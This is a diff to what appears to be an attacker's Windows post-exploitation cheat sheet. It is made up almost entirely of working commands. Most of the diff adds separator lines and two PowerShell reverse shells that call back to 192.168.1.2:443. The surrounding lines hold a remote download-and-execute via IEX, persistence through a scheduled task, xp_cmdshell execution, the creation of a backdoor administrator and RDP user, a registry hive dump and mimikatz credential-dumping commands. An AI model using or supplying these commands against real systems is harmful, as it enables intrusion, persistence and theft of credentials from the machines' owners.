@@ -10,6 +10,8 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"
 
+-------------------------------------------------------------------------------------------------------------------------------------
+
 schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
 schtasks /Query /FO List /v /TN "Driver Support"
 
@@ -23,6 +25,8 @@ exec xp_cmdshell 'whoami'
 osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"
 
 net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add
+
+-------------------------------------------------------------------------------------------------------------------------------------
 
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME
 
@@ -46,9 +50,17 @@ reg save HKLM\SYSTEM SYSTEM
 query session /server:
 reset session 1
 
+-------------------------------------------------------------------------------------------------------------------------------------
+
 privilege::debug
 token::elevate
 lsadump::sam
 sekurlsa::logonpasswords
 
+-------------------------------------------------------------------------------------------------------------------------------------
 
+$client = New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient("192.168.1.2",443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+-------------------------------------------------------------------------------------------------------------------------------------
